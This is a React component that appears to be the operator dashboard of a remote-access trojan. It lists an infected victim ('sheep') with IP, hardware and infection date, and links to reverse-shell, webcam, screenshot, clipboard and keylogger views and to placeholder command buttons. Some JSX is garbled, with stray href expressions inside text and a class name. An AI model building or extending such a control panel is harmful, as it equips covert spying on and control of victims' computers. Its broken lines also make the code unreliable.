import React, { useEffect, useState } from "react";
import { useLocation } from "react-router-dom";
import "bootstrap-icons/font/bootstrap-icons.css";
import { Helmet } from "react-helmet";
import Shell from "../Shell";
import { fetchInfectionData } from "./fetchUser";

function Features() {
  const [user, setUser] = useState(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  const location = useLocation();

  const query = new URLSearchParams(location.search);
  const userId = query.get("sheep");

  useEffect(() => {
    const getUser = async () => {
      try {
        const data = await fetchInfectionData(userId);
        setUser(data);
        setLoading(false);
      } catch (err) {
        setError(err);
        setLoading(false);
      }
    };

    if (userId) {
      getUser();
    } else {
      setLoading(false);
    }
  }, [userId]);

  if (loading) {
    return <div>Loading...</div>;
  }

  if (error) {
    return <div>Error: {error.message}</div>;
  }

  if (!user) {
    return <div>No user found</div>;
  }
  console.log(user.webcams[0]);
  return (
    <>
      <Helmet>
        <title>Visualisation - MNA0D</title>
      </Helmet>
      <link href="/assets/css/features.css" rel="stylesheet" />

      <div className="container px-4 py-5" id="hanging-icons">
        <h2 className="pb-2 border-bottom">Reverse-shell</h2>
        <Shell />
      </div>

      <div class="b-example-divider"></div>

      <div className="container px-4 py-5" id="custom-cards">
        <h2 className="pb-2 border-bottom">Visualisation</h2>
        <div className="row row-cols-1 row-cols-lg-3 align-items-stretch g-4 py-5">
          <div className="col visiualisation">
            <div
              className="card card-cover h-100 overflow-hidden text-white bg-dark rounded-5 shadow-lg "
              style={{
                backgroundImage: 'url("/assets/image/unsplash-photo-1.jpg")',
              }}
            >
              <div className="d-flex flex-column h-100 p-5 pb-3 text-white text-shadow-1 ">
                <a
                  href={`http://${user.webcams[0]}`}
                  className="no-line visiualisation-a"
                >
                  <h2 className="pt-5 mt-5 mb-4 display-6 lh-1 fw-bold">
                    Webcam
                  </h2>
                </a>
                <a href="#" className="no-line visiualisation-a">
                  <ul className="d-flex list-unstyled mt-auto">
                    <li className="me-auto">
                      <i class="bi bi-camera" width="1em" height="1em"></i>
                    </li>
                    <li className="d-flex align-items-center me-3">
                      <svg className="bi me-2" width="1em" height="1em">
                        <use xlinkHref="#geo-fill" />
                      </svg>
                      <small>Earth</small>
                    </li>
                    <li className="d-flex align-items-center">
                      <svg className="bi me-2" width="1em" height="1em">
                        <use xlinkHref="#calendar3" />
                      </svg>
                      <small>3d</small>
                    </li>
                  </ul>
                </a>
              </div>
            </div>
          </div>

          <div className="col visiualisation">
            <div
              className="card card-cover h-100 overflow-hidden text-white bg-dark rounded-5 shadow-lg"
              style={{
                backgroundImage: 'url("/assets/image/unsplash-photo-2.jpg")',
              }}
            >
              <div className="d-flex flex-column h-100 p-5 pb-3 text-white text-shadow-1">
                <a href="#" className="no-line visiualisation-a">
                  <a
                    href={`http://localhost:8080`}
                    className="no-line visiualisation-a"
                  >
                    <h2 className="pt-5 mt-5 mb-4 display-6 lh-1 fw-bold">
                      Ecran
                    </h2>
                  </a>
                  <ul className="d-flex list-unstyled mt-auto">
                    <li className="me-auto">
                      <i
                        class="bi bi-camera-reels"
                        width="1em"
                        height="1em"
                      ></i>
                    </li>
                    <li className="d-flex align-items-center me-3">
                      <svg className="bi me-2" width="1em" height="1em">
                        <use xlinkHref="#geo-fill" />
                      </svg>
                      <small>Pakistan</small>
                    </li>
                    <li className="d-flex align-items-center">
                      <svg className="bi me-2" width="1em" height="1em">
                        <use xlinkHref="#calendar3" />
                      </svg>
                      <small>4d</small>
                    </li>
                  </ul>
                </a>
              </div>
            </div>
          </div>

          <div className="col visiualisation">
            <div
              className="card card-cover h-100 overflow-hidden text-white bg-dark rounded-5 shadow-lg"
              style={{
                backgroundImage: 'url("/assets/image/unsplash-photo-3.jpg")',
              }}
            >
              <div className="d-flex flex-column h-100 p-5 pb-3 text-shadow-1">
                <a href="#" className="no-line visiualisation-a">
                  <a
                    href={`http://${user.screenshots[0]}`}
                    className="no-line visiualisation-a"
                  >
                    <h2 className="pt-5 mt-5 mb-4 display-6 lh-1 fw-bold">
                      Captures d'écran
                    </h2>
                  </a>
                  <ul className="d-flex list-unstyled mt-auto">
                    <li className="me-auto">
                      <i class="bi bi-easel" width="1em" height="1em"></i>
                    </li>
                    <li className="d-flex align-items-center me-3">
                      <svg className="bi me-2" width="1em" height="1em">
                        <use xlinkHref="#geo-fill" />
                      </svg>
                      <small>California</small>
                    </li>
                    <li className="d-flex align-items-center">
                      <svg className="bi me-2" width="1em" height="1em">
                        <use xlinkHref="#calendar3" />
                      </svg>
                      <small>5d</small> href={`http://${user.screenshots[0]}`}
                    </li>
                  </ul>
                </a>
              </div>
            </div>
          </div>
        </div>
      </div>

      <div class="b-example-divider"></div>

      <div class="container px-4 py-5" id="hanging-icons">
        <h2 class="pb-2 border-bottom">Informations principales</h2>
        <div class="row row-cols-1 row-cols   href={`http://${user.screenshots[0]}`}-lg-3 align-items-stretch g-4 py-5">
          <div class="col d-flex flex-column h-100 p-3 ">
            <a href="#" className="no-line">
              <div class="features-box width-box">
                <div class="icon-square bg-light text-dark flex-shrink-0 me-3">
                  <i class="bi bi-book" width="1em" height="1em"></i>
                </div>
                <div class="features-box-white">
                  <h2>{user.name}</h2>
                  <p>Ip : {user.ip}</p>
                  <p>Status: {user.active}</p>
                  <p>Region : {user.region ? "Oui" : "Non"}</p>
                  <p>Last activity : {user.lastActivity}</p>
                  <p>Infection date : {user.infectionDate}</p>
                  <p>CPU : {user.hardware.cpu}</p>
                  <p>RAM : {user.hardware.ram}</p>
                  <p>OS : {user.os.name}</p>
                </div>
              </div>
            </a>
          </div>
          <div class="col d-flex flex-column h-100 p-3 ">
            <a
              href={`http://localhost:8080/clipboard-view`}
              className="no-line"
            >
              <div class="features-box width-box">
                <div class="icon-square bg-light text-dark flex-shrink-0 me-3">
                  <i class="bi bi-clipboard" width="1em" height="1em"></i>
                </div>
                <div class="features-box-white">
                  <h2>Presse papier</h2>
                  <p>
                    Paragraph of text beneath the heading to explain the
                    heading. We'll add onto it with another sentence and
                    probably just keep going until we run out of words.
                  </p>
                </div>
              </div>
            </a>
          </div>
          <div class="col d-flex flex-column h-100 p-3 ">
            <a href="http://localhost:8080/keylog" className="no-line">
              <div class="features-box width-box">
                <div class="icon-square bg-light text-dark flex-shrink-0 me-3">
                  <i class="bi bi-keyboard" width="1em" height="1em"></i>
                </div>
                <div class="features-box-white">
                  <h2>Clavier</h2>
                  <a href={``} className="no-line">
                    <p>Afficher le press papier</p>
                  </a>
                </div>
              </div>
            </a>
          </div>
        </div>
      </div>

      <div class="b-example-divider"></div>
      <div class="container px-4 py-5" id="icon-grid">
        <h2 class="pb-2 border-bottom">Commandes</h2>
        <div class="row row-cols-1 row-cols-lg-3 align-items-stretch g-4 py-5">
          <div class="col d-flex align-items-start">
            <div class="features-box">
              <i className="bi text-muted flex-shrink-0 me-3 bi-emoji-angry"></i>
              <a href="#" className="no-line">
                <div id="features1">
                  <h4 className="fw-bold mb-0">Commande 1</h4>
                  <p>
                    Paragraph of text beneath the heading to explain the
                    heading.
                  </p>
                </div>
              </a>
            </div>
          </div>
          <div class="col d-flex align-items-start">
            <div class="features-box">
              <i class="bi text-muted flex-shrink-0 me-3 bi-emoji-dizzy"></i>
              <a href="#" className="no-line">
                <div id="features2">
                  <h4 class="fw-bold mb-0">Commande 2</h4>
                  <p>
                    Paragraph of text beneath the heading to explain the
                    heading.
                  </p>
                </div>
              </a>
            </div>
          </div>
          <div class="col d-flex align-items-start">
            <div class="features-box">
              <i class="bi text-muted flex-shrink-0 me-3 bi-emoji-astonished"></i>
              <a href="#" className="no-line">
                <div id="features3">
                  <h4 class="fw-bold mb-0">Commande 3</h4>
                  <p>
                    Paragraph of text beneath the heading to explain the
                    heading.
                  </p>
                </div>
              </a>
            </div>
          </div>
          <div class="col d-flex align-items-start">
            <div class="features-box">
              <i class="bi text-muted flex-shrink-0 me-3 bi-emoji-astonished"></i>
              <a href="#" className="no-line">
                <div id="features4">
                  <h4 class="fw-bold mb-0">Commande 4</h4>
                  <p>
                    Paragraph of text beneath the heading to explain the
                    heading.
                  </p>
                </div>
              </a>
            </div>
          </div>
          <div class="col d-flex align-items-start">
            <div class="features-box">
              <i class="bi text-muted flex-shrink-0 me-3 bi-emoji-expressionless"></i>
              <a href="#" className="no-line">
                <div id="features5">
                  <h4 class="fw-bold mb-0">Commande 5</h4>
                  <p>
                    Paragraph of text beneath the heading to explain the
                    heading.
                  </p>
                </div>
              </a>
            </div>
          </div>
          <div class="col d-flex align-items-start">
            <div class="features-box">
              <i class="bi text-muted flex-shrink-0 me-3 bi-emoji-frown"></i>
              <a href="#" class="no-line">
                <div id="features6">
                  <h4 class="fw-bold mb-0">Commande 6</h4>
                  <p>
                    Paragraph of text beneath the heading to explain the
                    heading.
                  </p>
                </div>
              </a>
            </div>
          </div>
          <div class="col d-flex align-items-start">
            <div class="features-box">
              <i class="bi text-muted flex-shrink-0 me-3 bi-emoji-wink"></i>
              <a href="#" class="no-line">
                <div id="features7">
                  <h4 class="fw-bold mb-0">Commande 7</h4>
                  <p>
                    Paragraph of text beneath the heading to explain the
                    heading.
                  </p>
                </div>
              </a>
            </div>
          </div>
          <div class="col d-flex align-items-start">
            <div class="features-box">
              <i class="bi text-muted flex-shrink-0 me-3 bi-emoji-smile"></i>
              <a href="#" class="no-line">
                <div id="features8">
                  <h4 class="fw-bold mb-0">Commande 8</h4>
                  <p>
                    Paragraph of text beneath the heading to explain the
                    heading.
                  </p>
                </div>
              </a>
            </div>
          </div>
          <div class="col d-flex align-items-start">
            <div class="features-box">
              <i class="bi text-muted flex-shrink-0 me-3 bi-emoji-smile-upside-down"></i>
              <a href="#" class="no-line">
                <div id="features9">
                  <h4 class="fw-bold mb-0">Commande 9</h4>
                  <p>
                    Paragraph of text beneath the heading to explain the
                    heading.
                  </p>
                </div>
              </a>
            </div>
          </div>
        </div>
      </div>
    </>
  );
}

export default Features;
